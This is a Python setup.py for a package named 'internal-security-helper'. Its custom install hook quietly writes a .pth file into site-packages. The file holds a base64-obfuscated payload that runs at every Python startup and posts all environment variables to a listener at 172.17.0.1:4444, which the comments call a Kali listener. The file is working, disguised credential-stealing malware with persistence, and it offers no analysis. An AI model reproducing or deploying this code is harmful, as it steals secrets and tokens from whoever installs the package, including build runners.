import os
import base64
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        # Path to site-packages
        site_packages = self.install_lib
        pth_file = os.path.join(site_packages, "internal_security_init.pth")
        
        # The Payload: Sends environment variables to your Kali listener
        # This executes every time ANY python script starts on this runner
        payload = "import os, requests; requests.post('http://172.17.0.1:4444', data=dict(os.environ))"
        b64_payload = base64.b64encode(payload.encode()).decode()
        
        with open(pth_file, "w") as f:
            f.write(f"import os, base64; exec(base64.b64decode('{b64_payload}'))\n")
        
        install.run(self)

setup(
    name="internal-security-helper",
    version="1.0.1",
    cmdclass={'install': CustomInstall},
)
